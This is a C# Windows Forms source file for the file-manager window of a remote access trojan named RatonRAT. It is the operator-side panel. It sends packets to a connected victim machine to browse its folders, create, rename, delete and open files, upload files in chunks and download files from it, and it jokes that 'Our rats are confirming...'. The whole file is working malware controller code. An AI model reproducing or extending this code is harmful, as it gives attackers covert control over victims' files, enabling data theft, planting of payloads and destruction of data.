using Server.Connection;
using Stuff;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatonRAT.ClientForms
{
    public partial class FormFileManager : Form
    {
        public SillyClient SillyClient { get; set; }

        private bool isMouseDown = false;

        private Point mouseOffset;

        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }

        public FormFileManager()
        {
            InitializeComponent();
        }

        private void createToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FormSelect select = new FormSelect();
            select.textBox1.Text = "RatonFolder_" + Helpers.Random(6);
            if (select.ShowDialog() == DialogResult.OK)
            {
                string name = select.textBox1.Text;
                if (String.IsNullOrEmpty(name)) return;
                Pack pack = new Pack();
                pack.Set("Packet", "Manager");
                pack.Set("Action", "NewFolder");
                pack.Set("Target", Path.Combine(textBox1.Text, name));
                SillyClient.Send(pack.Pacc());
                label3.Visible = true;
                Goto(textBox1.Text);
            }
        }

        private void FormFileManager_Load(object sender, EventArgs e)
        {
            textBox1.Region = new Region(CreateRoundPath(textBox1.ClientRectangle, 15));
            for (int i = 1; i <= 19; i++)
            {
                Control btn = this.Controls.Find("button" + i, true).FirstOrDefault();

                if (btn != null)
                    btn.Region = new Region(CreateRoundPath(btn.ClientRectangle, 15));
            }
            new RatonRAT.Classes.LightMode().Apply(this);
            timer1.Start();
            this.Paint += Form_Paint;
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            this.MouseDown += Form_MouseDown;
            this.MouseMove += Form_MouseMove;
            this.MouseUp += Form_MouseUp;
        }

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem thing in listView1.SelectedItems)
            {
                Pack pack = new Pack();
                pack.Set("Packet", "Manager");
                pack.Set("Action", "Open");
                pack.Set("Target", (string)thing.Tag);
                SillyClient.Send(pack.Pacc());
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FormSelect select = new FormSelect();
            select.textBox1.Text = "RatonRename_" + Helpers.Random(7) + ".extension";
            if (select.ShowDialog() == DialogResult.OK)
            {
                string inputData = select.textBox1.Text;
                if (String.IsNullOrEmpty(inputData)) return;
                if (listView1.SelectedItems.Count > 1)
                {
                    int x = 1;
                    foreach (ListViewItem selected in listView1.SelectedItems)
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "Manager");
                        pack.Set("Action", "Rename");
                        pack.Set("Folder", selected.SubItems[columnHeader3.Index].Text == "Folder");
                        pack.Set("Old", (string)selected.Tag);
                        pack.Set("New", Path.Combine(textBox1.Text, inputData + "_" + x++));
                        SillyClient.Send(pack.Pacc());
                        Goto(textBox1.Text);
                    }
                }
                else
                {
                    Pack pack = new Pack();
                    pack.Set("Packet", "Manager");
                    pack.Set("Action", "Rename");
                    pack.Set("Folder", listView1.SelectedItems[0].SubItems[columnHeader3.Index].Text == "Folder");
                    pack.Set("Old", (string)listView1.SelectedItems[0].Tag);
                    pack.Set("New", Path.Combine(textBox1.Text, inputData));
                    SillyClient.Send(pack.Pacc());
                    label3.Visible = true;
                    Goto(textBox1.Text);
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in listView1.SelectedItems)
            {
                Pack msgPack = new Pack();
                msgPack.Set("Packet", "Manager");
                msgPack.Set("Action", "Delete");
                msgPack.Set("Folder", selected.SubItems[columnHeader3.Index].Text == "Folder");
                msgPack.Set("Target", (string)selected.Tag);
                SillyClient.Send(msgPack.Pacc());
                label3.Visible = true;
                Goto(textBox1.Text);
            }
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Goto(comboBox1.Text);
        }

        public void Goto(string path)
        {
            if (!String.IsNullOrEmpty(path))
            {
                Pack pack = new Pack();
                pack.Set("Packet", "Manager");
                pack.Set("Action", "Goto");
                pack.Set("Path", path);
                SillyClient.Send(pack.Pacc());
                listView1.Enabled = false;
                listView1.Visible = false;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            label3.Visible = true;
            Goto(textBox1.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            label3.Visible = true;
            string path = textBox1.Text;
            if (path.Length >= 3)
            {
                path = path.Remove(path.LastIndexOfAny(new char[] { '\\' }, path.LastIndexOf('\\')));
                if (!path.Contains(@"\"))
                {
                    path = path + @"\";
                }
                Goto(path);
            }
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[columnHeader3.Index].Text == "Folder")
            {
                string path = (string)listView1.SelectedItems[0].Tag;
                Goto(path);
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = true;
            openFileDialog.Filter = "All files (*.*)|*.*";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                foreach (string file in openFileDialog.FileNames)
                {
                    string fileName = Path.GetFileName(file);
                    string Duid = Helpers.Random();
                    long fileSize = new FileInfo(file).Length;
                    FormFile fileForm = (FormFile)Application.OpenForms["File ID: " + Duid];
                    if (fileForm == null)
                    {
                        fileForm = new FormFile
                        {
                            Name = "File ID: " + Duid,
                            Text = "File ID: " + Duid,
                            SillyClient = SillyClient,
                            UID = SillyClient.uid,
                            FileName = Path.GetFileName(file),
                            FileSize = fileSize
                        };
                        fileForm.Show();
                        Task.Run(() =>
                        {
                            if (fileSize > 0)
                            {
                                Pack pack = null;
                                int count = 1;
                                if (fileSize < SillyClient.OneMb)
                                {
                                    pack = new Pack();
                                    pack.Set("Packet", "Upload");
                                    pack.Set("isCompleted", false);
                                    pack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(fileName + Duid + count)));
                                    pack.Set("FileBytes", File.ReadAllBytes(file));
                                    SillyClient.Send(pack.Pacc());
                                    fileForm.TotalFileSize += fileSize;
                                }
                                else
                                {
                                    int bytesRead = 0;
                                    long totalSize = fileSize;
                                    byte[] buffer = new byte[SillyClient.OneMb];
                                    using (Stream source = File.OpenRead(file))
                                    {
                                        while (((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0) && SillyClient.isConnected())
                                        {
                                            pack = new Pack();
                                            pack.Set("Packet", "Upload");
                                            pack.Set("isCompleted", false);
                                            pack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(Path.GetFileName(file) + Duid + (count++).ToString())));
                                            pack.Set("FileBytes", buffer);
                                            SillyClient.Send(pack.Pacc());
                                            fileForm.TotalFileSize += buffer.Length;
                                            totalSize -= bytesRead;
                                            if (totalSize < SillyClient.OneMb)
                                                buffer = new byte[totalSize];
                                        }
                                    }
                                }

                                pack = new Pack();
                                pack.Set("Packet", "Upload");
                                pack.Set("DUID", Duid);
                                pack.Set("isCompleted", true);
                                pack.Set("FileName", fileName);
                                pack.Set("FileSize", new FileInfo(file).Length);
                                pack.Set("FilePath", textBox1.Text);
                                pack.Set("TempCount", count);
                                SillyClient.Send(pack.Pacc());
                            }
                            Thread.Sleep(800);
                            this.Invoke(new MethodInvoker(() => fileForm.progressBar1.Value = 100));
                            fileForm.timer2.Stop();
                            fileForm.Status("Our rats are confirming...");
                        });
                    }
                }
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            button1.PerformClick();
        }

        private void reloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            button2.PerformClick();
        }

        private void downloadToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            foreach (ListViewItem selectedItem in listView1.SelectedItems)
            {
                if (selectedItem.SubItems[columnHeader3.Index].Text == "Folder") continue;

                string Duid = Helpers.Random();
                Pack pack = new Pack();
                pack.Set("Packet", "Download");
                pack.Set("File", selectedItem.Tag);
                pack.Set("DUID", Duid);
                string formname = "File ID: "; 
                FormFile formFile = (FormFile)Application.OpenForms[formname + Duid];
                if (formFile == null)
                {
                    formFile = new FormFile
                    {
                        Name = formname + Duid,
                        Text = formname + Duid,
                        SillyClient = SillyClient,
                    };
                    formFile.Show();
                    SillyClient.Send(pack.Pacc());
                }
            }
        }
    }
}
